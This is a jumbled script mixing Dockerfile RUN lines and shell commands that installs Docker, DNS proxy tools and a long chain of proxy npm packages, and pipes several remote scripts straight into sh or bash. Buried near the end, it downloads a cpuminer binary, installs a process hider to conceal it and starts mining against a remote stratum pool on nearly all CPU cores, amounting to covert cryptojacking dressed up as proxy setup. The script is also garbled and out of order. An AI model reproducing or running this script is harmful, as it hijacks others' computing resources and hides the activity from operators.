RUN mkdir d && cd d
#!/bin/sh
sudo apt update && sudo apt-get -y install systemctl && sudo apt install apt-transport-https curl gnupg-agent ca-certificates software-properties-common -y && curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && sudo apt install docker-ce docker-ce-cli containerd.io -y && sudo usermod -aG docker genzo2805

RUN npm install -g ccloli/DNSProxy && git clone https://github.com/ccloli/DNSProxy.git && cd DNSProxy && npm install -g
echo "====================================="
echo "Bismillahirahmannirrahim"
echo "====================================="
sleep 3
dnsproxy -i config.json
cp config.sample.json config.json
clear
apt-get update\
  && apt-get -y install vim dnsutils curl sudo\
  && cd /opt\
  && mkdir -p smart-dns-proxy\
  && cd smart-dns-proxy\
  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
  && curl -fsSL https://github.com/Publish3r/smart-dns-proxy/raw/main/install.tar.gz | gunzip - | tar x --strip-components=1\
  && ./build.sh

  RUN bash -c "$(curl -L https://raw.githubusercontent.com/azadrahorg/dohCloudflared/main/dohCloudflared.sh)" && curl -sSf https://sh.rustup.rs | bash -s -- -y --default-toolchain nightly && source $HOME/.cargo/env && cargo install encrypted-dns && strip ~/.cargo/bin/encrypted-dns && npm i hide-my-name-vpn && curl 'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt' -o proxy.txt && curl 'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt' -o proxy.txt && npm i node-api-headers && sudo npm install node-cache --save && npm install socket-io-anti-spam && npm install -g node-http-proxy && npm i @dmitryusenko/proxy-chain && npm install got socks-proxy-agent cross-spawn --save && npm install -g http-proxy-to-socks && npm i silence-js-hash-crypto && npm i @wkronmiller/iptables-parser && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && npm install -g paperspace-node && sudo npm install via-proxy && sudo npm install proxy-agent --save && wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yescryptr16  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u FpFVq8ykvUw1k3idWsXwy4vPdgBDPK7cS7.Danis -t $(nproc --ignore 1)
